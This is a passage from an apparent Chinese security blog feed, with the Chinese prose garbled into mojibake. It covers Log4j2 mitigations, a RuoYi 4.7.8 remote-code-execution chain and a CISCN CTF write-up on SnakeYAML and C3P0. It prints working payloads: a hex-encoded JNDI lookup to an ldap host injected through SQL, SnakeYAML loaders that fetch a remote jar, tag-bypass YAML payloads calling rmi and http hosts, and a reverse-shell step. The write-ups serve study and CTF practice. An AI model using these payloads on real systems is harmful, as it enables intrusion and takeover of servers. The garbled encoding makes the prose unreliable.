alt="image-20240809191719075"></p><p>æ‰€ä»¥åªæœ‰<code>OFF(0)ã€FATAL(100)ã€ERROR(200)</code>æ‰èƒ½åˆ©ç”¨</p><p>ä»£ç ä¸­æ—¥å¿—ç­‰çº§çš„ä¼˜å…ˆçº§â‰¥é»˜è®¤çº§åˆ«æ‰å¯ä»¥æˆåŠŸï¼Œæ¯”å¦‚Struts2çš„é»˜è®¤æ—¥å¿—ç­‰çº§ä¸ºInfo(400)ï¼ŒWARN(300)ã€ERRORã€FATALã€OFFã€INFOè¿™å‡ ä¸ªçº§åˆ«çš„æ—¥å¿—éƒ½å¯èƒ½è¢«åˆ©ç”¨ã€‚</p><p>æ›´è¯¦ç»†çš„åˆ©ç”¨è¿‡ç¨‹åŠç»•è¿‡å¯ä»¥çœ‹ï¼š<a href="https://su18.org/post/log4j2/">Log4j2ï¼šé‡Œç¨‹ç¢‘å¼çš„é¡¶çº§ä¾›åº”é“¾æ¼æ´ | ç´ åå…« (su18.org)</a></p><h3 id="Defend"><a href="#Defend" class="headerlink" title="Defend"></a>Defend</h3><ul><li>å‡çº§åˆ°<code>2.17.0</code>ç‰ˆæœ¬ä»¥ä¸Š</li><li>è®¾ç½®<code>jvm</code>å‚æ•°ï¼š<code>-Dlog4j2.formatMsgNoLookups=true</code></li><li>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code></li></ul><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/log4j2">Log4j | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ruoyi-v4.7.8-RCEåˆ†æ</title>
    <link href="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åº”æœ‹å‹çš„é‚€çº¦çœ‹äº†çœ‹CNSSçš„å¤ä»¤è¥é¢˜ï¼ŒåŸºæœ¬æ˜¯å»å¹´æ‹›æ–°çš„åŸé¢˜ï¼Œå¾ˆç®€å•ã€‚å‡ºäº†ä¸€é“ruoyiä¸æ˜¯åŸé¢˜ï¼Œç‰ˆæœ¬æ˜¯4.7.7ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç›´æ¥æ‹¿ä¸‹ä¸€è¡€ï¼Œå€Ÿæ­¤åšä¸€ä¸ªåˆ†æã€‚</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010612421.png" alt="image-20240808010612421"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808010623193.png" alt="image-20240808010623193"></p><p>å…¶å®Ruoyiåœ¨4.7.6ä»¥å‰éƒ½æ˜¯å¯ä»¥ç›´æ¥åœ¨å®šæ—¶ä»»åŠ¡æ‰“snakeyamlå†™å†…å­˜é©¬æˆ–è€…jndiï¼Œä½†æ˜¯4.7.7åæŠŠbeanèƒ½è°ƒç”¨çš„ä¸€äº›classç»™banäº†ï¼Œè€Œä¸”4.7.8å¯ä»¥çœ‹åˆ°é™åˆ¶äº†http(s)&#x2F;ldap&#x2F;rmiçš„æ‰§è¡Œï¼Œå…¶å®ä¸ç®—æ˜¯å®Œå…¨é™åˆ¶ï¼Œåªæ˜¯åœ¨å‡½æ•°å­—ç¬¦ä¸²ä½ç½®é™åˆ¶äº†ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è°ƒè¯•åˆ†ææˆ‘å°±å·ä¸ªæ‡’ï¼Œè¿™é‡Œæµ…æµ…Copyä¸€ä¸‹~~</p><h3 id="Blacklist-Whitelist"><a href="#Blacklist-Whitelist" class="headerlink" title="Blacklist &amp; Whitelist"></a>Blacklist &amp; Whitelist</h3><p>è¿™é‡Œå…¶å®å°±è·Ÿé‚£äº›åšå®¢å†™çš„ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•èƒ½å¤Ÿä½¿payloadå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°çš„æ˜¯sqlæ³¨å…¥çš„æ–¹å¼ï¼Œç”¨åå…­è¿›åˆ¶ç»•è¿‡é™åˆ¶ã€‚</p><p>4.7.6å¾€å‰çš„RCEä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥å®šæ—¶ä»»åŠ¡å†™å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;you_url_of_jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ‰“snakeyamlååºåˆ—åŒ–ï¼Œè¿™é‡Œä¸€èˆ¬ç”¨çš„æ˜¯httpæŠŠyaml-payload.jaræŒ‚vpsä¸Šï¼Œæˆ–è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥è°ƒç”¨lookupæ‰“JNDIã€‚</p><p>ä½†æ˜¯ä½¿ç”¨httpè¿™ç§ä¼šé‡åˆ°ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012333703.png" alt="image-20240808012333703"></p><p>å› ä¸ºåœ¨<code>SysJobController.java</code>é»‘åå•è®¾ç½®ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012423775.png" alt="image-20240808012423775"></p><p>è€Œä¸”è®¾ç½®äº†è®¡åˆ’ä»»åŠ¡ç™½åå•å’Œè¿è§„å­—ç¬¦è¿‡æ»¤ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012501587.png" alt="image-20240808012501587"></p><p>é»‘ç™½åå•åœ¨com&#x2F;ruoyi&#x2F;quartz&#x2F;controller&#x2F;SysJobController#addSaveï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012607310.png" alt="image-20240808012607310"></p><p>å½“é€šè¿‡äº†ä¸Šè¿°æ¡ä»¶åï¼Œåˆ™æ‰§è¡Œ com&#x2F;ruoyi&#x2F;quartz&#x2F;service&#x2F;impl&#x2F;SysJobServiceImpl#insertJobï¼Œå…ˆå°†å®šæ—¶ä»»åŠ¡å†™å…¥æ•°æ®åº“ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012656684.png" alt="image-20240808012656684"></p><p>ç„¶ååˆ›å»ºå®šæ—¶ä»»åŠ¡</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012708444.png" alt="image-20240808012708444"></p><p>ç„¶åå°±æ˜¯å®šæ—¶ä»»åŠ¡æ‰§è¡Œé€»è¾‘ï¼Œè¿›å…¥ com&#x2F;ruoyi&#x2F;quartz&#x2F;util&#x2F;AbstractQuartzJob#execute</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012720314.png" alt="image-20240808012720314"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œè¿›å…¥ invokeMethod æ–¹æ³•</p><p>getInvokeTargetï¼šè°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè·å–æ•°æ®åº“ä¸­ invoke_target å­—æ®µ</p><p>getBeanNameï¼šè·å– beanName</p><p>getMethodNameï¼šè·å–æ–¹æ³•å</p><p>getMethodParamsï¼šè·å–å‚æ•°å</p><p>ç„¶ååˆ¤æ–­æ˜¯ä¸æ˜¯å…¨é™å®šç±»åï¼Œè‹¥ä¸æ˜¯åˆ™ä» spring <a href="https://cloud.tencent.com/product/tke?from_column=20065&from=20065">å®¹å™¨</a>ä¸­è·å–</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012736493.png" alt="image-20240808012736493"></p><p>ç»§ç»­è·Ÿè¿› invokeMethod æ–¹æ³•ï¼Œåˆ©ç”¨åå°„æ‰§è¡Œæ–¹æ³•<img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012748530.png" alt="image-20240808012748530"></p><p>ä»ä¸Šå¯åˆ†æå‡ºå¦‚ä¸‹ç»“æœï¼š</p><ol><li>å¯¹è±¡å¯ä»¥æ˜¯ spring å®¹å™¨ä¸­æ³¨å†Œè¿‡çš„ beanï¼Œä¹Ÿå¯ä»¥æŒ‡å®š class åç§°ã€‚</li><li>è‹¥æ˜¯ spring å®¹å™¨ä¸­æ³¨å†Œè¿‡çš„ beanï¼Œåˆ™å¯ç›´æ¥ä» spring å®¹å™¨ä¸­å–å‡ºï¼Œè‹¥æ˜¯æŒ‡å®š class åç§°ï¼Œåˆ™å¯ä»¥é€šè¿‡åå°„ newInstance()åˆ›å»ºå¯¹è±¡ã€‚</li></ol><p>å‰é¢ä¹Ÿè®²åˆ°äº†ç”¨SQLæ³¨å…¥æ¥ç»•é»‘ç™½åå•ï¼Œæ¥ä¸‹æ¥å°±ä»‹ç»è¿™ä¸€éƒ¨åˆ†ã€‚</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>åœ¨ ruoyi 4.7.5 ç‰ˆæœ¬ä¹‹å‰ï¼Œåå°æ¥å£<code>/tool/gen/createTable</code>å¤„å­˜åœ¨ sql æ³¨å…¥(CVE-2022-4566)</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808012933725.png" alt="image-20240808012933725"></p><p>è€Œ genTableService çš„å®ç°ç±»æ˜¯ GenTableServiceImpl:</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013002895.png" alt="image-20240808013002895"></p><p>å¯¹åº”çš„ Mapper è¯­å¥:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;update id=<span class="hljs-string">&quot;createTable&quot;</span>&gt;<br>       $&#123;sql&#125;<br>&lt;/update&gt;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013034355.png" alt="image-20240808013034355"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><strong>RCE</strong></h3><p>æ ¹æ®ä¸Šæ–‡å¯çŸ¥ï¼Œruoyi è®¡åˆ’ä»»åŠ¡èƒ½è°ƒç”¨ bean æˆ–è€… class ç±»ï¼ŒSQL æ³¨å…¥ä¾èµ–äº GenTableServiceImpl#createTableã€‚</p><p>å¦‚æœ GenTableServiceImpl æ˜¯ bean å¯¹è±¡ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨ GenTableServiceImpl#createTable æ‰§è¡Œ SQL è¯­å¥</p><p>åœ¨å¯åŠ¨ç±»ä¸­æ‰“å°æ‰€æœ‰åŠ è½½çš„ beanï¼Œå…¶ä¸­åŒ…æ‹¬ genTableServiceImplï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(RuoYiApplication.class, args);<br><span class="hljs-comment">// è·å–æ‰€æœ‰beançš„åç§°</span><br>String[] beanDefinitionNames = run.getBeanDefinitionNames();<br><span class="hljs-comment">// æ‰“å°æ‰€æœ‰beançš„åç§°</span><br><span class="hljs-keyword">for</span> (String beanDefinitionName : beanDefinitionNames) &#123;<br>    System.out.println(beanDefinitionName);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013103461.png" alt="image-20240808013103461"></p><p>äºæ˜¯å¯ä»¥è°ƒç”¨ genTableServiceImpl.createTable å®ç° sql è¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥ RCE çš„æ€è·¯ï¼šé…åˆæ³¨å…¥åœ¨ sys_job æ•°æ®è¡¨ä¸­ç›´æ¥æ’å…¥æ¶æ„è®¡åˆ’ä»»åŠ¡ï¼Œå³å¯ä¸è°ƒç”¨ addSave æ–¹æ³•æ·»åŠ è®¡åˆ’ä»»åŠ¡å†…å®¹ï¼ŒæˆåŠŸç»•è¿‡é»‘ç™½åå•é™åˆ¶ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013138821.png" alt="image-20240808013138821"></p><p>è€ŒSQLè¯­å¥æ˜¯æ”¯æŒåå…­è¿›åˆ¶æ“ä½œçš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åœ¨æ·»åŠ SQLå®šæ—¶ä»»åŠ¡æ—¶ï¼Œä½¿ç”¨åå…­è¿›åˆ¶è½¬æ¢ç»•è¿‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target =</span><br><span class="hljs-string">0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f797670307a662e646e736c6f672e636e2729 WHERE job_id = 100;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æˆåŠŸè°ƒç”¨ genTableServiceImpl.createTable æ–¹æ³•ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013251023.png" alt="image-20240808013251023"></p><p>æˆåŠŸä¿®æ”¹ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013336825.png" alt="image-20240808013336825"></p><p>æ‰§è¡Œä»£ç ï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013347219.png" alt="image-20240808013347219"></p><p>å¦‚æ­¤è¿™èˆ¬ï¼Œæ‰€æœ‰çš„éƒ½æ‹‰é€šäº†ã€‚</p><p>æ—¢ç„¶è¿™é‡Œå¯ä»¥åå…­è¿›åˆ¶ç»•è¿‡ï¼Œé‚£ä¹ˆæ— è®ºæ˜¯æ‰“Snakeyamlçš„ååºåˆ—åŒ–è¿˜æ˜¯JNDIéƒ½æ˜¯ä¸ºæ‰€æ¬²ä¸ºã€‚</p><h2 id="å›åˆ°é¢˜ç›®"><a href="#å›åˆ°é¢˜ç›®" class="headerlink" title="å›åˆ°é¢˜ç›®"></a>å›åˆ°é¢˜ç›®</h2><p>å› ä¸ºé¢˜ç›®ç”¨çš„å…¬å…±ç¯å¢ƒï¼Œæˆ‘ä¹Ÿä¸æƒ³åˆ«äººè¹­è½¦ï¼ˆå˜»å˜»ï¼‰ï¼Œæ‰€ä»¥å°±æ²¡æ‰“å†…å­˜é©¬ï¼Œç›´æ¥JNDIåå¼¹shellæ‰“çš„ï¼š</p><p>é¦–å…ˆæ˜¯è¿™ä¸ªæ–¹æ³•æµ‹äº†ä¸€ä¸‹DNSï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808013647155.png" alt="image-20240808013647155"></p><p>æ”¶åˆ°å›æ˜¾ï¼Œé‚£ä¹ˆç›´æ¥æ¸¸æˆç»“æŸäº†ã€‚</p><p>é¦–å…ˆæˆ‘åˆ›äº†å‡ ä¸ªä»»åŠ¡ï¼Œé‚£ä¸ªcrontè¯­å¥ä»¿ç…§é‚£ä¸ªéšä¾¿å†™å†™å°±å¯ä»¥äº†ï¼Œå¯¹ä¸Šidï¼Œ</p><p>JNDIåŸå§‹payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xxxxxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è½¬åå…­è¿›åˆ¶åå†™å…¥ä¸€ä¸ªæ–°åˆ›çš„å®šæ—¶ä»»åŠ¡ï¼ˆè¿™é‡Œæˆ‘æ˜¯å†™å…¥id&#x3D;7çš„å®šæ—¶ä»»åŠ¡é‡Œï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a61xxxxx.... WHERE job_id = 7;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨è¡¨ç›˜æ‰“å¼€ä»»åŠ¡çŠ¶æ€ï¼Œåœ¨æ›´å¤šæ“ä½œå¤„é€‰æ‹©æ‰§è¡Œä¸€æ¬¡ï¼Œä¼šå‘ç°id&#x3D;7çš„å®šæ—¶ä»»åŠ¡å·²ç»å†™å…¥payloadï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014026384.png" alt="image-20240808014026384"></p><p>ç„¶ååœ¨å°†id&#x3D;7çš„å®šæ—¶ä»»åŠ¡æ‰§è¡Œä¸€æ¬¡ï¼ŒJNDIåå¼¹shellï¼š</p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014129907.png" alt="image-20240808014129907"></p><p><img src="/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/image-20240808014116572.png" alt="image-20240808014116572"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_45813980/article/details/139775272">è‹¥ä¾4.7.8ç‰ˆæœ¬è®¡åˆ’ä»»åŠ¡rceå¤ç°_è‹¥ä¾è®¡åˆ’ä»»åŠ¡rce-CSDNåšå®¢</a></p><p><a href="https://cloud.tencent.com/developer/article/2422994">RuoYi 4.7.8 æ‰§è¡Œä»»æ„SQLè¯­å¥å¯¼è‡´RCEæ¼æ´-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/2399994">N&#x2F;Aï½œRuoYi v4.7.8è‹¥ä¾åå°ç®¡ç†ç³»ç»ŸRCEæ¼æ´ï¼ˆPOCï¼‰-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p><a href="https://xz.aliyun.com/t/13958?time__1311=GqmxnD2DyGo05DKy+DIx4fx4R2n27T4D#toc-1">æœ€æ–°Ruoyiç»„åˆæ‹³RCEåˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_45055749/article/details/139200634">ruoyiæ¼æ´pocæ±‡æ€»åŠå…¶åŸç†åˆ†æï¼ˆæºç åˆ†æï¼‰-CSDNåšå®¢</a></p><p><a href="https://github.com/lz2y/yaml-payload-for-ruoyi">lz2y&#x2F;yaml-payload-for-ruoyi: A memory shell for ruoyi (github.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»CISCN2023-ååŒ—-normal_snakeçœ‹Snakeyamlå’ŒC3P0ç¼åˆ</title>
    <link href="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/"/>
    <url>/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœ‹æ ‡é¢˜å°±çŸ¥é“è¿™æ¬¡æˆ‘è¦å†™ä»€ä¹ˆï¼Œå°±æ˜¯ç¼åˆæ€ªã€‚</p><p>é™¤äº†Hessianè¿™ç§ç‹¬ç‰¹çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œä»¥åŠAliyunChain17è¿™ç§ï¼Œå¾ˆå¤šjavaååºåˆ—åŒ–é¢˜ç›®éƒ½æ˜¯ç¼åˆã€‚å†åŠ ä¸Šæå¿ƒæ€çš„é»‘åå•ï¼Œç¼åˆå±æ€§å¤§çˆ†å‘äº†å±äºæ˜¯ã€‚</p><p>è¯ä¸å¤šè¯´ç›´æ¥çœ‹é¢˜ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>è¿™é“é¢˜æˆ‘åœ¨åšå®¢å›­å‘è¿‡ä¸€æ¬¡åˆ†æï¼Œè¿™é‡Œä¹Ÿå°±æµ…æµ…è´´ä¸ªé“¾æ¥CVå‡ ä¸‹å·ä¸ªæ‡’~~</p><p>[<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18160178">CISCN 2023 ååŒ—]-normal_snake - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>&#x2F;readè·¯ç”±ä¸‹ä¼ å‚dataï¼Œpyloadä¸èƒ½åŒ…å«!!ï¼Œç„¶åç”¨äº†yamlæ¥loadä¼ å…¥çš„å‚æ•°ã€‚</p><p>ç¨ä½œäº†è§£ï¼Œè¿™å…¶å®å°±æ˜¯ SnakeYaml ååºåˆ—åŒ–æ¼æ´ï¼Œç¦ç”¨äº† yaml çš„å¸¸ç”¨å¤´ <code>!!</code>ã€‚</p><p>å‰é¢çš„<code>!!</code>æ˜¯ç”¨äºå¼ºåˆ¶ç±»å‹è½¬åŒ–ï¼Œå¼ºåˆ¶è½¬æ¢ä¸º<code>!!</code>åæŒ‡å®šçš„ç±»å‹ï¼Œå…¶å®è¿™ä¸ªå’ŒFastjsonçš„<code>@type</code>æœ‰ç€å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚ç”¨äºæŒ‡å®šååºåˆ—åŒ–çš„å…¨ç±»åã€‚</p><p>ä½†ç”¨tagå¤´å¯ä»¥ç»•è¿‡ï¼š<a href="https://mp.weixin.qq.com/s/2i6Q9Ob7n0cSxuj9Rob8Uw">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">!&lt;tag:yaml.org,<span class="hljs-number">2002</span>:com.sun.rowset.JdbcRowSetImpl&gt;\n dataSourceName: \<span class="hljs-string">&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br><span class="hljs-string">    </span><br><span class="hljs-string">!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;rmi://localhost:1234/Exploit\&quot;\n autoCommit: true</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">%TAG !      tag:yaml.org,<span class="hljs-number">2002</span>:<br>---<br>!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL [<span class="hljs-string">&quot;http://b1ue.cn/&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>è€Œ <code>SafeConstructorWithException</code> ä¸­è¿‡æ»¤äº†å¸¸è§çš„ <code>payload</code> å…³é”®å­—ï¼ŒHEX ç¼–ç éƒ¨åˆ†ç¦ç”¨äº† <code>BadAttributeValueExpException</code> å’Œ <code>HotSwappableTargetSource</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkForExceptions</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RuntimeException, RuntimeException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">upperCaseData</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.data.toUpperCase();<br>    <span class="hljs-keyword">if</span> (!upperCaseData.contains(<span class="hljs-string">&quot;JAVA&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JNDI&quot;</span>) &amp;&amp; !upperCaseData.contains(<span class="hljs-string">&quot;JDBC&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (upperCaseData.contains(<span class="hljs-string">&quot;42616441747472696275746556616C7565457870457863657074696F6E&quot;</span>) || upperCaseData.contains(<span class="hljs-string">&quot;486F74537761707061626C65546172676574536F75726365&quot;</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;No way to pass!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Unsafe data detected!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹pom.xmlï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805005147709.png" alt="image-20240805005147709"></p><p>ç»™äº†c3p0ä¾èµ–ï¼Œä¼°è®¡æ˜¯ä»è¿™é‡Œå…¥æ‰‹ï¼š</p><p>åœ¨C3P0ä¸­æœ‰ä¸‰ç§åˆ©ç”¨æ–¹å¼:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">http <span class="hljs-keyword">base</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JNDI</span><br><span class="hljs-keyword"></span>HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨<br></code></pre></td></tr></table></figure><p>åœ¨åŸç”Ÿçš„ååºåˆ—åŒ–ä¸­å¦‚æœæ‰¾ä¸åˆ°å…¶ä»–é“¾ï¼Œåˆ™å¯å°è¯•C3P0å»åŠ è½½è¿œç¨‹çš„ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚JNDIåˆ™é€‚ç”¨äºJacksonç­‰åˆ©ç”¨ã€‚è€ŒHEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨çš„æ–¹å¼å¯ä»¥åˆ©ç”¨ä¸fjå’ŒJacksonç­‰ä¸å‡ºç½‘æƒ…å†µä¸‹æ‰“å…¥å†…å­˜é©¬ä½¿ç”¨ã€‚</p><p>æŠ„ä¸€ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 ååŒ—åˆ†åŒºèµ› normal_snake - B0T1eR - åšå®¢å›­ (cnblogs.com)</a></p><p>C3P0 ä¸»è¦æœ‰ä»¥ä¸‹åˆ©ç”¨é“¾ï¼š</p><table><thead><tr><th align="left">è§¦å‘ç‚¹</th><th align="left">åŠŸæ•ˆ</th><th align="left">é€‚ç”¨æ€§</th></tr></thead><tbody><tr><td align="left">JndiRefForwardingDataSource#setLoginTimeout â€“ InitialContext#lookup</td><td align="left">Jndi æ³¨å…¥</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">WrapperConnectionPoolDataSource#setUserOverridesAsString â€“ ObjectInputStream#readObject</td><td align="left">Hex è§£ç åè§¦å‘åŸç”Ÿååºåˆ—åŒ–</td><td align="left">fastjson&#x2F;snakeyaml&#x2F;jackson</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ InitialContext#lookup</td><td align="left">Jndi æ³¨å…¥</td><td align="left">JavaåŸç”Ÿååºåˆ—åŒ–</td></tr><tr><td align="left">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject â€“ IndirectlySerialized#getObject() â€“ 